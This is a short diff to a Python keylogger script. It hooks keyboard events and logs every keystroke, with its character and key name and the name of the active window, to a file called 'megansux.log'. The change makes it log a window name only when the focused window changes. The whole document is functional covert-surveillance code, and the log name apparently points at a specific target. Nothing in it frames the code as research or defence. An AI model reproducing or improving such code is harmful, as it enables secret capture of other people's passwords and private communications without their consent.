@@ -8,10 +8,15 @@ except:
 
 logging.basicConfig(filename="megansux.log", level=logging.INFO, format='%(asctime)s %(message)s')
 
+window = None
+
 def OnKeyboardEvent(event):
 #    logging.info('MessageName: %s',event.MessageName)
 #    logging.info('Time: %s',event.Time)
-    logging.info('WindowName: %s',event.WindowName)
+    global window
+    if event.WindowName != window:
+        window = event.WindowName
+        logging.info('New Window: %s',event.WindowName)
     logging.info('Ascii: %s %s', event.Ascii, chr(event.Ascii))
     logging.info('Key: %s', event.Key)
 
